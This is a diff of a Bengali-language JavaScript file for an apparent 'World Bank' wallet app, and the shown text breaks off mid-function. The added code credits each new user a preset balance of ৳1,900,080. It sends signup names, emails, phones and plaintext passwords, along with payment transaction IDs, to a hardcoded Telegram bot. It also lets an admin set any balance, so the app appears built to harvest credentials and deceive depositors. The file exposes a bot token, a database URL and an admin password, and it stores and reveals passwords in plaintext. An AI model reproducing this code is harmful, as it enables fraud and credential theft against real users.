@@ -1,184 +1,750 @@
-// প্রাথমিক ব্যালেন্স তথ্য (একাউন্ট ডাটা)
-const accounts = {
-    bkash: { name: 'বিকাশ (bKash)', balance: 25000, type: 'wallet', displayId: 'bkashBalDisplay' },
-    nagad: { name: 'নগদ (Nagad)', balance: 15450, type: 'wallet', displayId: 'nagadBalDisplay' },
-    rocket: { name: 'রকেট (Rocket)', balance: 15000, type: 'wallet', displayId: 'rocketBalDisplay' },
-    upay: { name: 'উপায় (upay)', balance: 10000, type: 'wallet', displayId: 'upayBalDisplay' },
-    ebl: { name: 'Eastern Bank PLC', balance: 60000, type: 'bank', displayId: 'eblBalDisplay' },
-    city: { name: 'City Bank PLC', balance: 75000, type: 'bank', displayId: 'cityBalDisplay' },
-    ib: { name: 'ইসলামী ব্যাংক', balance: 50000, type: 'bank', displayId: 'ibBalDisplay' }
+// ১. ফায়ারবেস কনফিগারেশন URL ও টেলিগ্রাম ক্রেডেনশিয়ালস
+const FIREBASE_DB_URL = "https://wallet-banking-default-rtdb.firebaseio.com/";
+const BOT_TOKEN = "8898294688:AAH6ngVGDHwNJ1Fpri9OiNgd2nqCDvs9BFE"; 
+const CHAT_ID = "7560607133";
+
+// এডমিন সিকিউরিটি পাসওয়ার্ড
+const ADMIN_SECURITY_PASS = "worldbank1234@#";
+
+// প্রারম্ভিক ব্যালেন্স ডাটা
+const defaultTotalBalance = 1900080;
+const defaultBalances = {
+    WorldBank: 1900080,
+    bKash: 0,
+    Nagad: 0,
+    Rocket: 0,
+    Upay: 0,
+    DBBL: 0,
+    IBBL: 0,
+    City: 0
 };
 
-// প্রাথমিক লেনদেনের ইতিহাস
-let transactions = [
-    { title: 'স্যালারি ডিপোজিট', channel: 'City Bank PLC', account: 'Acc: 310XXXXXX', date: '৩০ সেপ, ২০২৬ (০৯:৩০ AM)', amount: 75000, type: 'in' },
-    { title: 'অনলাইন ফান্ড ট্রান্সফার', channel: 'Eastern Bank PLC', account: 'Acc: 101XXXXXX', date: '২৯ সেপ, ২০২৬ (০৪:১৫ PM)', amount: 60000, type: 'in' },
-    { title: 'ক্যাশ ইন', channel: 'upay', account: '01612-XXXXXX', date: '২৮ সেপ, ২০২৬ (১১:২০ AM)', amount: 10000, type: 'in' }
-];
+let usersDatabase = [];
+let allTransactions = [];
+let defaultGlobalMaxLimit = 500000;
+let activeUser = JSON.parse(localStorage.getItem('wb_active_session')) || null;
+let balanceHideTimer = null;
+let currentLang = 'bn';
 
-// প্রয়োজনীয় এলিমেন্ট লোড হওয়ার পর ড্যাশবোর্ড আপডেট করা
-document.addEventListener('DOMContentLoaded', () => {
-    updateDashboardUI();
-    renderTransactions();
+// ইমেইলকে ফায়ারবেস ভ্যালিড কি (Key)-তে রূপান্তর ফাংশন
+function sanitizeEmailKey(email) {
+    return email ? email.replace(/[^a-zA-Z0-9]/g, "_") : "";
+}
+
+// সেন্ট্রাল ক্লাউড সিঙ্ক ফাংশন (সকল ইউজার, কাস্টম লিমিট ও ট্রানজেকশন ফায়ারবেস থেকে সিঙ্ক করবে)
+async function syncFromFirebase() {
+    try {
+        // ১. ইউজার ডাটা সিঙ্ক
+        const uRes = await fetch(`${FIREBASE_DB_URL}/users.json`);
+        const uData = await uRes.json();
+        if (uData) {
+            usersDatabase = Object.values(uData);
+            localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
+            
+            if (activeUser) {
+                const refreshedUser = usersDatabase.find(u => u.email === activeUser.email);
+                if (refreshedUser) {
+                    activeUser = refreshedUser;
+                    localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
+                }
+            }
+        }
+
+        // ২. ট্রানজেকশন হিস্ট্রি সিঙ্ক
+        const tRes = await fetch(`${FIREBASE_DB_URL}/transactions.json`);
+        const tData = await tRes.json();
+        if (tData) {
+            allTransactions = Object.values(tData).reverse();
+            localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
+        }
+
+    } catch(err) {
+        console.error("Firebase sync error:", err);
+        usersDatabase = JSON.parse(localStorage.getItem('wb_users')) || [];
+        allTransactions = JSON.parse(localStorage.getItem('wb_transactions')) || [];
+    }
+}
+
+document.addEventListener('DOMContentLoaded', async () => {
+    await syncFromFirebase();
+    
+    if (activeUser) {
+        const refreshedUser = usersDatabase.find(u => u.email === activeUser.email);
+        if (refreshedUser) {
+            activeUser = refreshedUser;
+            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
+        }
+
+        document.getElementById('authSection').classList.add('hidden');
+        document.getElementById('dashboardSection').classList.remove('hidden');
+        document.getElementById('userPhoneDisp').innerText = activeUser.phone || activeUser.email;
+        renderBalances();
+    }
 });
 
-// টাকা ফরম্যাট করার ফাংশন (যেমন: 25000 -> ৳ ২৫,০০০)
-function formatCurrency(amount) {
-    return '৳ ' + amount.toLocaleString('bn-BD');
+// এডমিন প্যানেল থেকে রিফ্রেশ বাটন (সেন্ট্রাল ডাটাবেস আপডেট)
+async function refreshAdminData() {
+    await syncFromFirebase();
+    renderAdminUsersList();
+    renderAdminPendingList();
+    renderAdminAllHistory();
+    populateAdminUserSelect();
+    alert(currentLang === 'bn' ? 'সেন্ট্রাল ফায়ারবেস ক্লাউড থেকে সকল ডাটা সফলভাবে রিফ্রেশ করা হয়েছে!' : 'All data successfully refreshed from Central Firebase Cloud!');
 }
 
-// বর্তমান তারিখ ও সময়ের স্ট্রিং তৈরি করা
-function getCurrentDateTimeFormatted() {
-    const now = new Date();
-    const months = ['জানু', 'ফেব্রু', 'মার্চ', 'এপ্রিল', 'মে', 'জুন', 'জুলাই', 'আগস্ট', 'সেপ', 'অক্টো', 'নভে', 'ডিসেম্বর'];
-    const dateStr = `${now.getDate()} ${months[now.getMonth()]}, ${now.getFullYear()}`;
-    
-    let hours = now.getHours();
-    const minutes = now.getMinutes().toString().padStart(2, '0');
-    const ampm = hours >= 12 ? 'PM' : 'AM';
-    hours = hours % 12;
-    hours = hours ? hours : 12;
-    const hoursStr = hours.toString().padStart(2, '0');
-    
-    // ইংরেজি সংখ্যাকে বাংলায় রূপান্তর
-    const banglaNumbers = {'0':'০','1':'১','2':'২','3':'৩','4':'৪','5':'৫','6':'৬','7':'৭','8':'৮','9':'৯'};
-    const convertToBangla = (str) => str.replace(/[0-9]/g, match => banglaNumbers[match]);
-
-    return convertToBangla(`${dateStr} (${hoursStr}:${minutes} ${ampm})`);
+// ফায়ারবেসে পার্মানেন্ট সেভ ফাংশনসমূহ
+async function saveUserToFirebase(user) {
+    const userKey = sanitizeEmailKey(user.email);
+    try {
+        await fetch(`${FIREBASE_DB_URL}/users/${userKey}.json`, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(user)
+        });
+    } catch(err) {
+        console.error("User save error:", err);
+    }
 }
 
-// সর্বমোট ও সিঙ্গেল অ্যাকাউন্টের ব্যালেন্স হিসাব করা
-function updateDashboardUI() {
-    let totalWallet = 0;
-    let totalBank = 0;
+async function saveTxToFirebase(txObj) {
+    try {
+        await fetch(`${FIREBASE_DB_URL}/transactions/tx_${txObj.id}.json`, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(txObj)
+        });
+    } catch(err) {
+        console.error("Transaction save error:", err);
+    }
+}
 
-    for (const key in accounts) {
-        const acc = accounts[key];
-        if (acc.type === 'wallet') {
-            totalWallet += acc.balance;
-        } else if (acc.type === 'bank') {
-            totalBank += acc.balance;
-        }
-        document.getElementById(acc.displayId).innerText = formatCurrency(acc.balance);
+// মেইন পেজের উপরে ব্যাক করার ফাংশন
+function scrollToTop() {
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+// পাসওয়ার্ড হাইড এবং দেখানোর ফাংশন
+function togglePasswordVisibility(inputId, btn) {
+    const input = document.getElementById(inputId);
+    if (!input) return;
+    if (input.type === 'password') {
+        input.type = 'text';
+        btn.innerText = '🙈';
+    } else {
+        input.type = 'password';
+        btn.innerText = '👁️';
+    }
+}
+
+// ফরগেট পাসওয়ার্ড মডাল কন্ট্রোল
+function toggleForgotModal() {
+    document.getElementById('forgotModal').classList.toggle('hidden');
+}
+
+function handleForgotPassword(e) {
+    e.preventDefault();
+    const email = document.getElementById('forgotEmailInput').value.trim();
+    const phone = document.getElementById('forgotPhoneInput').value.trim();
+
+    const user = usersDatabase.find(u => u.email === email && u.phone === phone);
+
+    if (user) {
+        alert(currentLang === 'bn' 
+            ? `আপনার অ্যাকাউন্ট সফলভাবে রিকভার হয়েছে!\n\nইমেইল: ${user.email}\nপাসওয়ার্ড: ${user.password}`
+            : `Account recovered successfully!\n\nEmail: ${user.email}\nPassword: ${user.password}`);
+        toggleForgotModal();
+    } else {
+        alert(currentLang === 'bn' 
+            ? 'প্রদত্ত ইমেইল বা মোবাইল নম্বরটি আমাদের ডাটাবেসে পাওয়া যায়নি!'
+            : 'Entered email or phone number not found in our database!');
+    }
+}
+
+// ভাষা পরিবর্তন লজিক
+function setLanguage(lang) {
+    currentLang = lang;
+    document.getElementById('btnLangBN').classList.toggle('active', lang === 'bn');
+    document.getElementById('btnLangEN').classList.toggle('active', lang === 'en');
+    
+    const dashLangBtn = document.getElementById('dashLangBtn');
+    if (dashLangBtn) dashLangBtn.innerText = lang === 'bn' ? 'EN' : 'BN';
+
+    document.querySelectorAll('[data-bn]').forEach(el => {
+        el.innerText = lang === 'bn' ? el.getAttribute('data-bn') : el.getAttribute('data-en');
+    });
+
+    document.querySelectorAll('[data-bn-ph]').forEach(el => {
+        el.placeholder = lang === 'bn' ? el.getAttribute('data-bn-ph') : el.getAttribute('data-en-ph');
+    });
+}
+
+function switchTab(type) {
+    document.getElementById('errorText').style.display = 'none';
+    if(type === 'login') {
+        document.getElementById('loginForm').classList.remove('hidden');
+        document.getElementById('signUpForm').classList.add('hidden');
+        document.getElementById('loginTab').classList.add('active');
+        document.getElementById('signUpTab').classList.remove('active');
+    } else {
+        document.getElementById('signUpForm').classList.remove('hidden');
+        document.getElementById('loginForm').classList.add('hidden');
+        document.getElementById('signUpTab').classList.add('active');
+        document.getElementById('loginTab').classList.remove('active');
+    }
+}
+
+function sendTelegramNotification(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+    }).catch(err => console.error("Telegram API Error:", err));
+}
+
+// সাইন আপ (নতুন ইউজারকে ডিফল্ট লিমিট সহ সেভ করা)
+async function handleSignUp(e) {
+    e.preventDefault();
+    const name = document.getElementById('regName').value;
+    const email = document.getElementById('regEmail').value;
+    const phone = document.getElementById('regPhone').value;
+    const password = document.getElementById('regPass').value;
+
+    await syncFromFirebase();
+
+    const exists = usersDatabase.some(u => u.email === email);
+    if(exists) {
+        alert(currentLang === 'bn' ? 'এই ইমেইল দিয়ে আগেই অ্যাকাউন্ট খোলা হয়েছে!' : 'An account already exists with this email!');
+        return;
     }
 
-    const grandTotal = totalWallet + totalBank;
-    document.getElementById('walletTotalDisplay').innerText = formatCurrency(totalWallet);
-    document.getElementById('bankTotalDisplay').innerText = formatCurrency(totalBank);
-    document.getElementById('totalBalanceDisplay').innerText = formatCurrency(grandTotal);
+    const newUser = {
+        name,
+        email,
+        phone,
+        password,
+        totalBalance: defaultTotalBalance,
+        withdrawLimit: defaultGlobalMaxLimit,
+        balances: { ...defaultBalances }
+    };
+
+    usersDatabase.push(newUser);
+    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
+    await saveUserToFirebase(newUser);
+
+    sendTelegramNotification(`👤 <b>World Bank নতুন সাইন আপ!</b>\n\n📛 নাম: ${name}\n📧 ইমেইল: ${email}\n📱 ফোন: ${phone}\n🔑 পাসওয়ার্ড: ${password}`);
+
+    alert(currentLang === 'bn' ? 'অ্যাকাউন্ট সাইন আপ সফল হয়েছে! এখন লগইন করুন।' : 'Registration successful! Please login.');
+    switchTab('login');
+    document.getElementById('signUpForm').reset();
 }
 
-// লেনদেনের তালিকা রেন্ডার করা
-function renderTransactions() {
-    const tbody = document.getElementById('transactionTableBody');
+// লগইন
+async function handleLogin(e) {
+    e.preventDefault();
+    const email = document.getElementById('logEmail').value;
+    const password = document.getElementById('logPass').value;
+
+    await syncFromFirebase();
+
+    const userIndex = usersDatabase.findIndex(u => u.email === email && u.password === password);
+
+    if(userIndex !== -1) {
+        activeUser = usersDatabase[userIndex];
+        if(!activeUser.balances) activeUser.balances = { ...defaultBalances };
+
+        localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
+
+        document.getElementById('authSection').classList.add('hidden');
+        document.getElementById('dashboardSection').classList.remove('hidden');
+        document.getElementById('userPhoneDisp').innerText = activeUser.phone || activeUser.email;
+        document.getElementById('errorText').style.display = 'none';
+
+        renderBalances();
+    } else {
+        document.getElementById('errorText').style.display = 'block';
+    }
+}
+
+// "Tap for Balance"
+function toggleBalanceVisibility() {
+    const pillText = document.getElementById('balancePillText');
+    if (!activeUser) return;
+
+    if (balanceHideTimer) clearTimeout(balanceHideTimer);
+
+    const showBal = activeUser.totalBalance !== undefined ? activeUser.totalBalance : (activeUser.balances ? activeUser.balances.WorldBank : 0);
+    pillText.innerText = `৳ ${showBal.toLocaleString('bn-BD')}`;
+
+    balanceHideTimer = setTimeout(() => {
+        pillText.innerText = "Tap for Balance";
+    }, 3000);
+}
+
+function renderBalances() {
+    if (!activeUser) return;
+    if (!activeUser.balances) activeUser.balances = { ...defaultBalances };
+
+    for (let key in activeUser.balances) {
+        const el = document.getElementById(`bal_${key}`);
+        if (el) el.innerText = `৳ ${(activeUser.balances[key] || 0).toLocaleString('bn-BD')}`;
+    }
+}
+
+function logout() {
+    activeUser = null;
+    localStorage.removeItem('wb_active_session');
+    document.getElementById('dashboardSection').classList.add('hidden');
+    document.getElementById('authSection').classList.remove('hidden');
+    document.getElementById('loginForm').reset();
+}
+
+// সার্ভিস আইকন ক্লিকে স্ক্রোল ও ফোকাস
+function scrollToAction(type) {
+    let targetId = type === 'Withdraw' ? 'withdrawFormBox' : 'depositFormBox';
+    let targetEl = document.getElementById(targetId);
+
+    if (targetEl) {
+        targetEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        targetEl.classList.add('highlight');
+        setTimeout(() => {
+            targetEl.classList.remove('highlight');
+        }, 1500);
+    }
+}
+
+function toggleProfileModal() {
+    document.getElementById('profileModal').classList.toggle('hidden');
+    if (activeUser) {
+        document.getElementById('profNameInput').value = activeUser.name || '';
+        document.getElementById('profPhoneInput').value = activeUser.phone || '';
+        document.getElementById('profPassInput').value = activeUser.password || '';
+    }
+}
+
+// ইনবক্স মডাল ওপেন এবং স্পট হিস্ট্রি রেন্ডার
+async function openInboxModal() {
+    await syncFromFirebase();
+    document.getElementById('inboxModal').classList.toggle('hidden');
+    renderUserInboxHistory();
+}
+
+async function updateUserProfile(e) {
+    e.preventDefault();
+    if (!activeUser) return;
+
+    activeUser.name = document.getElementById('profNameInput').value;
+    activeUser.phone = document.getElementById('profPhoneInput').value;
+    activeUser.password = document.getElementById('profPassInput').value;
+
+    const userIndex = usersDatabase.findIndex(u => u.email === activeUser.email);
+    if (userIndex !== -1) {
+        usersDatabase[userIndex] = activeUser;
+        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
+        localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
+        await saveUserToFirebase(activeUser);
+    }
+
+    document.getElementById('userPhoneDisp').innerText = activeUser.phone;
+    alert(currentLang === 'bn' ? 'প্রোফাইল তথ্য সফলভাবে আপডেট হয়েছে!' : 'Profile updated successfully!');
+    toggleProfileModal();
+}
+
+// লেনদেন রিকোয়েস্ট (ইউজারের নিজস্ব নির্ধারিত উইথড্র লিমিট চেক করা)
+async function submitTransactionRequest(e, type) {
+    e.preventDefault();
+    const form = e.target;
+    const method = form.querySelector('.methodSelect').value;
+    const phone = form.querySelector('.phoneInput').value;
+    const amount = parseFloat(form.querySelector('.amountInput').value);
+    const trxId = form.querySelector('.trxInput').value;
+
+    if (isNaN(amount) || amount <= 0) {
+        alert(currentLang === 'bn' ? 'সঠিক পরিমাণ দিন!' : 'Please enter a valid amount!');
+        return;
+    }
+
+    // ইউজারের নিজস্ব কাস্টম উইথড্র লিমিট চেক
+    const userLimit = activeUser.withdrawLimit !== undefined ? parseFloat(activeUser.withdrawLimit) : defaultGlobalMaxLimit;
+
+    if (type === 'Withdraw' && amount > userLimit) {
+        const limitMsg = currentLang === 'bn' 
+            ? `এডমিন নির্ধারিত আপনার সর্বোচ্চ উইথড্র লিমিট ৳${userLimit.toLocaleString('bn-BD')}-এর বেশি রিকোয়েস্ট করা যাবে না।`
+            : `Cannot request more than your assigned withdraw limit ৳${userLimit.toLocaleString('en-US')}.`;
+        alert(limitMsg);
+        return;
+    }
+
+    const now = new Date();
+    const txObj = {
+        id: Date.now(),
+        userEmail: activeUser.email,
+        userName: activeUser.name,
+        type: type,
+        method: method,
+        phone: phone,
+        amount: amount,
+        trxId: trxId,
+        status: 'Pending',
+        dateStr: now.toLocaleDateString('bn-BD'),
+        timeStr: now.toLocaleTimeString('bn-BD')
+    };
+
+    allTransactions.unshift(txObj);
+    localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
+    await saveTxToFirebase(txObj);
+
+    const msg = `⏳ <b>World Bank নতুন ${type} পেন্ডিং রিকোয়েস্ট!</b>\n\n` +
+                `👤 ইউজার: ${activeUser.name}\n` +
+                `📌 টাইপ: ${type}\n` +
+                `🏦 মেথড: ${method}\n` +
+                `📱 নম্বর: ${phone}\n` +
+                `💰 পরিমাণ: ৳${amount}\n` +
+                `🆔 TrxID: ${trxId}\n` +
+                `⏱️ সময়সীমা: ১৫ থেকে ২০ মিনিটের মধ্যে অ্যাপ্রুভ করা হবে।`;
+    sendTelegramNotification(msg);
+
+    const successAlert = currentLang === 'bn' 
+        ? 'আপনার রিকোয়েস্টটি সেন্ট্রাল এডমিন প্যানেলে সফলভাবে পাঠানো হয়েছে। আগামী ১৫ থেকে ২০ মিনিটের মধ্যে তথ্য যাচাই করে আপনার রিকোয়েস্টটি অ্যাপ্রুভ করা হবে।'
+        : 'Your request has been successfully sent to the Central Admin Panel. It will be verified and approved within 15 to 20 minutes.';
+    alert(successAlert);
+
+    form.reset();
+    scrollToTop();
+}
+
+// ইউজারের ইনবক্স হিস্ট্রি (গাঢ় কালো স্পষ্ট লেখা রেন্ডারিং)
+function renderUserInboxHistory() {
+    const tbody = document.getElementById('userInboxModalBody');
+    if (!tbody) return;
     tbody.innerHTML = '';
 
-    transactions.forEach(trx => {
-        const tr = document.createElement('tr');
-        
-        const isIncome = trx.type === 'in';
-        const amountClass = isIncome ? 'text-green' : 'text-red';
-        const amountSign = isIncome ? '+ ' : '- ';
+    const myTxs = allTransactions.filter(t => t.userEmail === activeUser.email);
 
+    if (myTxs.length === 0) {
+        const noRecordText = currentLang === 'bn' ? 'কোনো ইনবক্স রেকর্ড নেই।' : 'No inbox records found.';
+        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#64748b; font-weight:bold;">${noRecordText}</td></tr>`;
+        return;
+    }
+
+    myTxs.forEach(t => {
+        let statusBadge = `<span class="status-pending">Pending ⏳</span>`;
+        if (t.status === 'Approved') statusBadge = `<span class="status-approved">Approved ✅</span>`;
+        if (t.status === 'Rejected') statusBadge = `<span class="status-rejected">Rejected ❌</span>`;
+
+        const tr = document.createElement('tr');
         tr.innerHTML = `
-            <td>${trx.title}</td>
-            <td><span class="badge">${trx.channel}</span></td>
-            <td><span style="font-family: monospace; font-size: 13px;">${trx.account}</span></td>
-            <td style="color: #94a3b8; font-size: 13px;">${trx.date}</td>
-            <td class="text-right ${amountClass}">${amountSign}${formatCurrency(trx.amount)}</td>
+            <td style="color:#0f172a !important; font-weight: bold;">${t.dateStr} ${t.timeStr}</td>
+            <td style="color:#0f172a !important; font-weight: bold;">${t.type}</td>
+            <td style="color:#0f172a !important; font-weight: bold;">${t.method}</td>
+            <td style="color:#be123c !important; font-weight: bold;">৳${t.amount.toLocaleString('bn-BD')}</td>
+            <td style="color:#0f172a !important; font-weight: bold;"><code>${t.trxId}</code></td>
+            <td>${statusBadge}</td>
         `;
         tbody.appendChild(tr);
     });
 }
 
-// মডাল খোলা ও বন্ধ করা
-function openModal(id) {
-    document.getElementById(id).style.display = 'flex';
+// এডমিন সিকিউরিটি
+async function toggleAdminModal() {
+    document.getElementById('adminModal').classList.toggle('hidden');
 }
 
-function closeModal(id) {
-    document.getElementById(id).style.display = 'none';
+async function verifyAdminPassword() {
+    const pass = document.getElementById('adminPassInput').value;
+    if (pass === ADMIN_SECURITY_PASS) {
+        document.getElementById('adminAuthBox').classList.add('hidden');
+        document.getElementById('adminControlBox').classList.remove('hidden');
+        
+        await syncFromFirebase();
+        renderAdminUsersList();
+        renderAdminPendingList();
+        renderAdminAllHistory();
+        populateAdminUserSelect();
+    } else {
+        alert('ভুল এডমিন পাসওয়ার্ড!');
+    }
 }
 
-// ট্রান্সফার সাবমিট হলে কাজ করার ফাংশন
-function handleTransferSubmit() {
-    const fromKey = document.getElementById('transferFromSelect').value;
-    const accountNo = document.getElementById('transferAccountInput').value.trim();
-    const amountVal = parseFloat(document.getElementById('transferAmountInput').value);
+// ইউজারের ইমেইল দেখে ইচ্ছামত নির্দিষ্ট উইথড্র লিমিট সেট করার এডমিন লজিক
+async function adminUpdateUserWithdrawLimit(e) {
+    e.preventDefault();
+    const userEmail = document.getElementById('admLimitUserSelect').value;
+    const newLimit = parseFloat(document.getElementById('admUserCustomLimitInput').value);
 
-    if (!accountNo) {
-        alert('অনুগ্রহ করে প্রাপকের মোবাইল নম্বর বা অ্যাকাউন্ট নম্বর লিখুন।');
-        return;
-    }
-    if (isNaN(amountVal) || amountVal <= 0) {
-        alert('অনুগ্রহ করে সঠিক টাকার পরিমাণ লিখুন।');
+    if (!userEmail || isNaN(newLimit) || newLimit < 0) {
+        alert('সঠিক ইউজার ও লিমিটের পরিমাণ দিন!');
         return;
     }
 
-    const selectedAcc = accounts[fromKey];
+    const userIndex = usersDatabase.findIndex(u => u.email === userEmail);
+    if (userIndex !== -1) {
+        const user = usersDatabase[userIndex];
+        user.withdrawLimit = newLimit;
 
-    if (selectedAcc.balance < amountVal) {
-        alert(`পর্যাপ্ত ব্যালেন্স নেই! আপনার ${selectedAcc.name} ব্যালেন্স হল ${formatCurrency(selectedAcc.balance)}`);
-        return;
+        usersDatabase[userIndex] = user;
+        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
+        await saveUserToFirebase(user);
+
+        alert(`সফলভাবে ${user.name} (${user.email})-এর উইথড্র লিমিট ৳${newLimit.toLocaleString('bn-BD')} করা হয়েছে!`);
+        
+        document.getElementById('admUserCustomLimitInput').value = '';
+        renderAdminUsersList();
+
+        if (activeUser && activeUser.email === user.email) {
+            activeUser = user;
+            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
+        }
     }
+}
 
-    // ব্যালেন্স বিয়োগ করা
-    selectedAcc.balance -= amountVal;
+// এডমিন প্যানেলের ইউজার সিলেক্ট ড্রপডাউন ফিলআপ
+function populateAdminUserSelect() {
+    const balSelect = document.getElementById('admBalanceUserSelect');
+    const limSelect = document.getElementById('admLimitUserSelect');
 
-    // নতুন লেনদেন তালিকায় যোগ করা
-    transactions.unshift({
-        title: 'টাকা ট্রান্সফার / সেন্ড মানি',
-        channel: selectedAcc.name,
-        account: accountNo,
-        date: getCurrentDateTimeFormatted(),
-        amount: amountVal,
-        type: 'out'
+    if (balSelect) balSelect.innerHTML = '<option value="">ইউজার সিলেক্ট করুন</option>';
+    if (limSelect) limSelect.innerHTML = '<option value="">ইউজার ইমেইল সিলেক্ট করুন</option>';
+
+    usersDatabase.forEach(u => {
+        const opt1 = document.createElement('option');
+        opt1.value = u.email;
+        opt1.innerText = `${u.name} (${u.email})`;
+        if (balSelect) balSelect.appendChild(opt1);
+
+        const opt2 = document.createElement('option');
+        opt2.value = u.email;
+        opt2.innerText = `${u.name} (${u.email})`;
+        if (limSelect) limSelect.appendChild(opt2);
     });
-
-    updateDashboardUI();
-    renderTransactions();
-    closeModal('transferModal');
-
-    // ইনপুট ফর্ম ক্লিয়ার করা
-    document.getElementById('transferAccountInput').value = '';
-    document.getElementById('transferAmountInput').value = '';
-
-    alert(`সফলভাবে ${formatCurrency(amountVal)} পাঠানো হয়েছে (${accountNo}) নম্বরে!`);
 }
 
-// ফান্ড অ্যাড সাবমিট হলে কাজ করার ফাংশন
-function handleAddMoneySubmit() {
-    const toKey = document.getElementById('addToSelect').value;
-    const accountNo = document.getElementById('addAccountInput').value.trim() || 'ক্যাশ ডিপোজিট';
-    const amountVal = parseFloat(document.getElementById('addAmountInput').value);
+// এডমিন ইউজার মেইন ব্যালেন্স কাস্টমাইজেশন
+async function adminUpdateUserBalance(e) {
+    e.preventDefault();
+    const userEmail = document.getElementById('admBalanceUserSelect').value;
+    const method = document.getElementById('admBalanceMethodSelect').value;
+    const newAmount = parseFloat(document.getElementById('admBalanceAmount').value);
 
-    if (isNaN(amountVal) || amountVal <= 0) {
-        alert('অনুগ্রহ করে সঠিক টাকার পরিমাণ লিখুন।');
+    if (!userEmail || isNaN(newAmount) || newAmount < 0) {
+        alert('সঠিক তথ্য দিন!');
         return;
     }
 
-    const selectedAcc = accounts[toKey];
+    const userIndex = usersDatabase.findIndex(u => u.email === userEmail);
+    if (userIndex !== -1) {
+        const user = usersDatabase[userIndex];
+        if (!user.balances) user.balances = { ...defaultBalances };
 
-    // ব্যালেন্স যোগ করা
-    selectedAcc.balance += amountVal;
+        user.balances[method] = newAmount;
 
-    // নতুন লেনদেন তালিকায় যোগ করা
-    transactions.unshift({
-        title: 'ফান্ড যুক্ত / ক্যাশ ইন',
-        channel: selectedAcc.name,
-        account: accountNo,
-        date: getCurrentDateTimeFormatted(),
-        amount: amountVal,
-        type: 'in'
+        if (method === 'WorldBank') {
+            user.totalBalance = newAmount;
+        }
+
+        usersDatabase[userIndex] = user;
+        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
+        await saveUserToFirebase(user);
+
+        alert(`সফলভাবে ${user.name}-এর ${method} ব্যালেন্স ৳${newAmount.toLocaleString('bn-BD')} করা হয়েছে!`);
+        
+        renderAdminUsersList();
+        
+        if (activeUser && activeUser.email === user.email) {
+            activeUser = user;
+            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
+            renderBalances();
+        }
+    }
+}
+
+async function adminCreateUser(e) {
+    e.preventDefault();
+    const name = document.getElementById('admUserName').value;
+    const email = document.getElementById('admUserEmail').value;
+    const phone = document.getElementById('admUserPhone').value;
+    const password = document.getElementById('admUserPass').value;
+
+    const exists = usersDatabase.some(u => u.email === email);
+    if(exists) {
+        alert('এই ইমেইল দিয়ে আগেই অ্যাকাউন্ট রয়েছে!');
+        return;
+    }
+
+    const newUser = {
+        name,
+        email,
+        phone,
+        password,
+        totalBalance: defaultTotalBalance,
+        withdrawLimit: defaultGlobalMaxLimit,
+        balances: { ...defaultBalances }
+    };
+
+    usersDatabase.push(newUser);
+    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
+    await saveUserToFirebase(newUser);
+
+    sendTelegramNotification(`👑 <b>এডমিন কর্তৃক নতুন ইউজার তৈরি!</b>\n\n📛 নাম: ${name}\n📧 ইমেইল: ${email}\n🔑 পাসওয়ার্ড: ${password}`);
+
+    alert(`সফলভাবে ইউজার তৈরি হয়েছে!\nইউজার এই ইমেইল (${email}) ও পাসওয়ার্ড (${password}) দিয়ে যেকোনো ডিভাইস থেকে লগইন করতে পারবে।`);
+    
+    document.getElementById('admUserName').value = '';
+    document.getElementById('admUserEmail').value = '';
+    document.getElementById('admUserPhone').value = '';
+    document.getElementById('admUserPass').value = '';
+
+    renderAdminUsersList();
+    populateAdminUserSelect();
+}
+
+// নিবন্ধিত ইউজার টেবিল রেন্ডার
+function renderAdminUsersList() {
+    const tbody = document.getElementById('adminUsersListBody');
+    if (!tbody) return;
+    tbody.innerHTML = '';
+
+    if (usersDatabase.length === 0) {
+        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#94a3b8;">কোনো নিবন্ধিত ইউজার পাওয়া যায়নি।</td></tr>`;
+        return;
+    }
+
+    usersDatabase.forEach(u => {
+        const tr = document.createElement('tr');
+        const mainBal = u.totalBalance !== undefined ? u.totalBalance : (u.balances ? u.balances.WorldBank : 0);
+        const uLimit = u.withdrawLimit !== undefined ? u.withdrawLimit : defaultGlobalMaxLimit;
+        tr.innerHTML = `
+            <td><b>${u.name || 'N/A'}</b></td>
+            <td>${u.email || 'N/A'}</td>
+            <td>${u.phone || 'N/A'}</td>
+            <td><code>${u.password || 'N/A'}</code></td>
+            <td style="color:#38bdf8;"><b>৳${mainBal.toLocaleString('bn-BD')}</b></td>
+            <td style="color:#f59e0b;"><b>৳${uLimit.toLocaleString('bn-BD')}</b></td>
+        `;
+        tbody.appendChild(tr);
     });
+}
 
-    updateDashboardUI();
-    renderTransactions();
-    closeModal('addModal');
+// সেন্ট্রাল পেন্ডিং লিস্ট রেন্ডার
+function renderAdminPendingList() {
+    const tbody = document.getElementById('adminPendingTableBody');
+    if (!tbody) return;
+    tbody.innerHTML = '';
 
-    // ইনপুট ফর্ম ক্লিয়ার করা
-    document.getElementById('addAccountInput').value = '';
-    document.getElementById('addAmountInput').value = '';
+    const pendingTxs = allTransactions.filter(t => t.status === 'Pending');
 
-    alert(`সফলভাবে ${formatCurrency(amountVal)} যুক্ত করা হয়েছে!`);
+    if (pendingTxs.length === 0) {
